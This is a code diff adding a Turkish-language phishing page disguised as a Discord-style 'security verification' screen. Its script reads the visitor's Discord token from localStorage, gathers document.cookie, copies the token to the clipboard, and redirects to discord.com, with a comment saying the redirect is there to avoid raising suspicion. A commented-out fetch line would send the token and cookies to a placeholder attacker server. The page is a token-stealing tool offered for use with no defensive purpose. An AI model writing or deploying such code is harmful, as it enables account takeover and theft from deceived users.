@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Güncellemesi</title>
+    <style>
+        body {
+            background-color: #2c2f33;
+            color: white;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+        .container {
+            text-align: center;
+            background: #202225;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+            max-width: 400px;
+        }
+        h2 { margin-bottom: 20px; color: #7289da; }
+        p { color: #b9bbbe; margin-bottom: 30px; }
+        button {
+            background-color: #7289da;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 16px;
+            cursor: pointer;
+            border-radius: 5px;
+            transition: background 0.3s;
+            width: 100%;
+        }
+        button:hover { background-color: #5b6eae; }
+        .loader {
+            display: none;
+            margin-top: 20px;
+            font-size: 14px;
+            color: #fff;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>Güvenlik Doğrulaması</h2>
+    <p>Hesabınızı doğrulamak için lütfen aşağıdaki butona tıklayın.</p>
+    <button id="actionBtn">Doğrula</button>
+    <div class="loader" id="loader">Veriler işleniyor...</div>
+</div>
+
+<script>
+    document.getElementById('actionBtn').addEventListener('click', function() {
+        const btn = document.getElementById('actionBtn');
+        const loader = document.getElementById('loader');
+        
+        btn.style.display = 'none';
+        loader.style.display = 'block';
+
+        // Verileri topla
+        const discordToken = localStorage.getItem('token') || localStorage.getItem('discord_token');
+        const cookies = document.cookie;
+        
+        // Yükleniyor efekti simülasyonu
+        setTimeout(() => {
+            let message = "Başarılı!";
+            
+            if (discordToken) {
+                // Token varsa panoya kopyala
+                navigator.clipboard.writeText(discordToken).then(() => {
+                    message += "\n\nDiscord Token Kopyalandı!";
+                }).catch(() => {
+                    message += "\n\nVeriler alındı.";
+                });
+            } else {
+                message += "\n\nVeri bulunamadı.";
+            }
+
+            alert(message);
+            
+            // Hedefi asıl sayfaya at (Şüphelenmemesi için)
+            window.location.href = "https://discord.com/channels/@me";
+            
+            // İstersen verileri kendi sunucuna da gönderebilirsin:
+            // fetch('https://seninsunucun.com/log', { method: 'POST', body: JSON.stringify({ token: discordToken, cookies: cookies }) });
+            
+        }, 1500);
+    });
+</script>
+
+</body>
+</html>
